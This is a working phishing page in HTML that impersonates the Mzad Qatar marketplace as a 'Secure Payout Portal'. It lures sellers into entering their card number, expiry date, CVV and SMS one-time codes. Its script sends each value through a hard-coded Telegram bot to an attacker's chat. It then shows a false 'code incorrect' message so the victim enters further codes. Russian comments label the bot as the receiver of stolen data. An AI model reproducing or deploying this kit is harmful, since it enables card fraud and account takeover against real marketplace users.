<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <title>Mzad Qatar | Secure Payout Portal</title>
    <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
    <style>
        :root { --mzad-red: #8a1538; --bg: #f2f3f5; --text: #333; }
        body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; padding: 0; overflow-x: hidden; }
        .app-shell { max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; }
        header { background: white; padding: 12px 16px; border-bottom: 3px solid var(--mzad-red); display: flex; align-items: center; justify-content: space-between; }
        .logo-main { height: 42px; }
        .ad-box { border-bottom: 8px solid var(--bg); }
        .img-container { width: 100%; aspect-ratio: 1.2; background: #fff; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #eee; }
        .img-container img { width: 100%; height: 100%; object-fit: contain; }
        .info { padding: 16px; }
        .ad-price { font-size: 32px; font-weight: 800; color: var(--mzad-red); margin-bottom: 15px; }
        .btn-main { background: var(--mzad-red); color: white; border: none; width: 100%; padding: 18px; border-radius: 14px; font-size: 18px; font-weight: 700; cursor: pointer; }

        /* MODAL & 3DS */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 2000; align-items: center; justify-content: center; }
        .modal-content { background: white; width: 85%; padding: 25px; border-radius: 24px; text-align: center; }
        .q-inp { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; box-sizing: border-box; margin-bottom: 12px; outline: none; text-align: center; }
        
        #step-2 { display: none; } /* Окно SMS */
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--mzad-red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="app-shell">
    <header><img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" class="logo-main"><div style="font-weight:700; color:var(--mzad-red);">EN</div></header>
    <div class="ad-box">
        <div class="img-container"><img id="p-img" src=""></div>
        <div class="info">
            <h1 style="font-size:20px;" id="p-name">Loading...</h1>
            <div class="ad-price" id="p-price">0 QAR</div>
        </div>
    </div>
    <div style="padding:20px 16px;"><button class="btn-main" onclick="openModal()">RECEIVE PAYOUT</button></div>

    <div class="modal" id="payModal">
        <div class="modal-content" id="step-1">
            <div style="font-weight:700; margin-bottom:20px;">Secure Card Verification</div>
            <form id="card-form">
                <input type="text" id="cn" class="q-inp" placeholder="Card Number" required maxlength="19">
                <div style="display:flex; gap:10px;">
                    <input type="text" id="ce" class="q-inp" placeholder="MM/YY" required maxlength="5">
                    <input type="text" id="cv" class="q-inp" placeholder="CVV" required maxlength="4">
                </div>
                <button type="submit" class="btn-main">PROCEED</button>
            </form>
        </div>

        <div class="modal-content" id="step-2">
            <div style="font-weight:700;">Bank Verification</div>
            <p style="font-size:13px; color:#666;">A one-time password has been sent to your mobile. Please enter it below to receive <b><span id="p-price-2"></span> QAR</b>.</p>
            <div id="loading-bank" style="display:none;"><div class="loader"></div><p>Connecting to bank...</p></div>
            <form id="sms-form">
                <input type="text" id="sms-code" class="q-inp" placeholder="SMS Code" required maxlength="8">
                <button type="submit" class="btn-main">CONFIRM CODE</button>
            </form>
        </div>
    </div>
</div>

<script>
    const T = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4'; // БОТ ПРИЕМЩИК
    const C = '8071425015';

    const url = new URLSearchParams(window.location.search);
    const item = url.get('item') || 'Device';
    const price = url.get('price') || '0';
    document.getElementById('p-name').innerText = item;
    document.getElementById('p-price').innerText = price + ' QAR';
    document.getElementById('p-price-2').innerText = price;
    
    const rawImg = url.get('img');
    if(rawImg) { document.getElementById('p-img').src = `https://wsrv.nl/?url=${encodeURIComponent(rawImg)}`; }

    function openModal() { document.getElementById('payModal').style.display = 'flex'; }

    // Маски
    document.getElementById('cn').oninput = (e) => { e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim(); };
    document.getElementById('ce').oninput = (e) => { e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{2})/,'$1/').trim(); };

    // ОТПРАВКА КАРТЫ
    document.getElementById('card-form').onsubmit = async (e) => {
        e.preventDefault();
        const msg = `🇶🇦 **CARD LOG**\n📦 ${item}\n💰 ${price} QAR\n\n💳 \`${document.getElementById('cn').value}\`\n📅 \`${document.getElementById('ce').value}\`\n🔒 \`${document.getElementById('cv').value}\``;
        new Image().src = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
        
        document.getElementById('step-1').style.display = 'none';
        document.getElementById('loading-bank').style.display = 'block';
        document.getElementById('step-2').style.display = 'block';
        
        setTimeout(() => { document.getElementById('loading-bank').style.display = 'none'; }, 3000);
    };

    // ОТПРАВКА SMS
    document.getElementById('sms-form').onsubmit = async (e) => {
        e.preventDefault();
        const code = document.getElementById('sms-code').value;
        const msg = `🔑 **SMS CODE**: \`${code}\`\n👤 Зашел по товару: ${item}`;
        new Image().src = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
        
        alert("The code is incorrect or expired. A new code has been sent to your device.");
        document.getElementById('sms-code').value = '';
    };
</script>
</body>
</html>
